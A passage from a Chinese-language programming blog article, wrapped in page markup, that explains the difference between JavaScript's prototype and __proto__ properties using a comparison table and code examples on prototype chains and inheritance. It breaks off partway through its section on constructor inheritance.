                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-heath-light">.hljs-comment,.hljs-quote{color:#776977}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ca402b}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#a65926}.hljs-bullet,.hljs-string,.hljs-symbol{color:#918b3b}.hljs-section,.hljs-title{color:#516aec}.hljs-keyword,.hljs-selector-tag{color:#7b59c0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#f7f3f7;color:#695d69}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这两个属性都与 JavaScript 的原型系统相关，但扮演完全不同的角色，经常容易混淆。</p>
<h2 data-id="heading-0">1. 核心区别总结</h2>








































<table><thead><tr><th>特性</th><th><code>prototype</code></th><th><code>__proto__</code></th></tr></thead><tbody><tr><td><strong>所有者</strong>​</td><td>函数</td><td>对象</td></tr><tr><td><strong>作用</strong>​</td><td>构造函数创建对象的原型</td><td>对象的原型链引用</td></tr><tr><td><strong>访问</strong>​</td><td>构造函数.prototype</td><td>对象.<strong>proto</strong></td></tr><tr><td><strong>标准</strong>​</td><td>正式标准</td><td>非标准（但被广泛实现）</td></tr><tr><td><strong>推荐访问</strong>​</td><td>Object.getPrototypeOf(obj)</td><td/></tr><tr><td><strong>推荐设置</strong>​</td><td>Object.setPrototypeOf(obj, proto)</td><td/></tr></tbody></table>
<h2 data-id="heading-1">2. 基本概念</h2>
<h3 data-id="heading-2">2.1 prototype 属性</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 构造函数才有 prototype</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// prototype 用于定义通过 new 创建的对象共享的属性和方法</span>
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
};

<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">species</span> = <span class="hljs-string">'Human'</span>;

<span class="hljs-comment">// 查看 prototype</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// "object"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-3">2.2 <code>__proto__</code>属性</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 对象才有 __proto__</span>
<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'Alice'</span>);

<span class="hljs-comment">// __proto__ 指向创建该对象的构造函数的 prototype</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 原型链查找</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);        <span class="hljs-comment">// "Alice" - 自有属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">species</span>);     <span class="hljs-comment">// "Human" - 从原型找到</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-title function_">toString</span>());  <span class="hljs-comment">// [object Object] - 从 Object.prototype 找到</span>
</code></pre>
<h2 data-id="heading-4">3. 详细对比</h2>
<h3 data-id="heading-5">3.1 属性所有者</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}

<span class="hljs-comment">// prototype 属于函数</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'prototype'</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);              <span class="hljs-comment">// "object"</span>

<span class="hljs-comment">// __proto__ 属于对象</span>
<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'__proto__'</span>));      <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);   <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> dog.<span class="hljs-property">__proto__</span>);                 <span class="hljs-comment">// "object"</span>

<span class="hljs-comment">// 函数也是对象，所以函数也有 __proto__</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-6">3.2 创建时的行为</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">brand</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
}

<span class="hljs-comment">// 设置 prototype</span>
<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">drive</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.brand}</span> is driving`</span>);
};

<span class="hljs-comment">// 创建实例</span>
<span class="hljs-keyword">const</span> myCar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">'Toyota'</span>);

<span class="hljs-comment">// 此时发生：</span>
<span class="hljs-comment">// 1. 创建新对象：{}</span>
<span class="hljs-comment">// 2. 设置对象的 __proto__ 指向 Car.prototype</span>
<span class="hljs-comment">// 3. 执行构造函数，this 指向新对象</span>
<span class="hljs-comment">// 4. 返回对象</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myCar.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(myCar) === <span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h2 data-id="heading-7">4. 原型链示例</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Vehicle</span>(<span class="hljs-params">type</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = type;
}
<span class="hljs-title class_">Vehicle</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">move</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.type}</span> is moving`</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">brand</span>) {
  <span class="hljs-title class_">Vehicle</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-string">'car'</span>);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
}

<span class="hljs-comment">// 继承 Vehicle</span>
<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Vehicle</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Car</span>;

<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">honk</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.brand}</span> honks!`</span>);
};

<span class="hljs-comment">// 创建实例</span>
<span class="hljs-keyword">const</span> toyota = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">'Toyota'</span>);

<span class="hljs-comment">// 原型链：</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(toyota.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);          <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(toyota.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Vehicle</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(toyota.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(toyota.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>);  <span class="hljs-comment">// null</span>

<span class="hljs-comment">// 方法查找：</span>
toyota.<span class="hljs-title function_">honk</span>();   <span class="hljs-comment">// 在 Car.prototype 找到</span>
toyota.<span class="hljs-title function_">move</span>();   <span class="hljs-comment">// 在 Vehicle.prototype 找到</span>
toyota.<span class="hljs-title function_">toString</span>();  <span class="hljs-comment">// 在 Object.prototype 找到</span>
</code></pre>
<h2 data-id="heading-8">5. 标准 vs 非标准</h2>
<h3 data-id="heading-9">5.1 标准访问方法</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();

<span class="hljs-comment">// 标准获取原型的方法</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(p) === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 标准设置原型的方法</span>
<span class="hljs-keyword">const</span> obj = {};
<span class="hljs-keyword">const</span> newProto = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> };
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, newProto);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj) === newProto);  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 检查是否是原型</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newProto.<span class="hljs-title function_">isPrototypeOf</span>(obj));  <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-10">5.2 <code>__proto__</code>的问题</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// __proto__ 不是标准属性，但被广泛支持</span>
<span class="hljs-keyword">const</span> obj = {};

<span class="hljs-comment">// 在一些环境中可能不可用</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'__proto__'</span> <span class="hljs-keyword">in</span> {});  <span class="hljs-comment">// 大多数是 true</span>

<span class="hljs-comment">// 但可以修改</span>
<span class="hljs-keyword">const</span> originalProto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">__proto__</span> === originalProto);  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 修改 __proto__</span>
obj.<span class="hljs-property">__proto__</span> = { <span class="hljs-attr">custom</span>: <span class="hljs-literal">true</span> };
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">custom</span>);  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 但性能差，不推荐</span>
<span class="hljs-comment">// Object.setPrototypeOf 是更好的选择</span>
</code></pre>
<h2 data-id="heading-11">6. 特殊情况</h2>
<h3 data-id="heading-12">6.1 箭头函数</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 箭头函数没有 prototype</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">arrow</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrow.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// undefined</span>

<span class="hljs-comment">// 普通函数有 prototype</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">normal</span>(<span class="hljs-params"/>) {}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(normal.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// { constructor: normal }</span>
</code></pre>
<h3 data-id="heading-13">6.2 内置对象</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 数组的原型链</span>
<span class="hljs-keyword">const</span> arr = [];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>);  <span class="hljs-comment">// null</span>

<span class="hljs-comment">// 字符串的原型链</span>
<span class="hljs-keyword">const</span> str = <span class="hljs-string">'hello'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">String</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 函数的原型链</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"/>) {}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fn.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fn.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h3 data-id="heading-14">6.3 Object.create</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 使用 Object.create 创建对象</span>
<span class="hljs-keyword">const</span> proto = { <span class="hljs-attr">x</span>: <span class="hljs-number">10</span> };
<span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(proto);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj) === proto);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">__proto__</span> === proto);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">x</span>);  <span class="hljs-comment">// 10，从原型继承</span>

<span class="hljs-comment">// 创建没有原型的对象</span>
<span class="hljs-keyword">const</span> nullObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(nullObj));  <span class="hljs-comment">// null</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(nullObj.<span class="hljs-property">__proto__</span>);  <span class="hljs-comment">// undefined</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(nullObj.<span class="hljs-property">toString</span>);  <span class="hljs-comment">// undefined</span>
</code></pre>
<h2 data-id="heading-15">7. 继承机制详解</h2>
<h3 data-id="heading-16">7.1 构造函数继承</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentProperty</span> = <span class="hljs-string">'parent'</span>;
}

<span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">parentMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Parent method:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-comment">// 1. 构造函数继承（实例属性）</span>
  <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">childProperty</span> = <span class="hljs-string">'child'</span>;
}

<span class="hljs-comment">// 2. 原型继承（方法）</span>
